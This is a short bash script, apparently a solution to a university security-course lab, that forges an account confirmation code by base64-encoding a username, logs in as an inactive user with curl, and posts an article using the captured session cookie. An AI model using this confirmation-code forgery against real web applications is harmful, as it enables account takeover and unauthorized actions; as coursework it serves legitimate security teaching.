#!/bin/bash

baseUrl=$1
# baseUrl="http://ugster505.student.cs.uwaterloo.ca/i4chung"

# 3a) compute confirmation code
confirmCode(){
  echo -n $1 | base64
}

# 3b) Login as inactive user
inactive="armadillogold"
curl -X GET $baseUrl/confirm.php?code=$(confirmCode $inactive) \
  -c cookie.txt -v 2> >(grep "<" > response.txt) 

# 3c) article
curl -X POST $baseUrl/post.php \
  -d "title=Hello&content=World&type=1&form=content" \
  -b cookie.txt -v 2> >(grep "<" >> response.txt) 
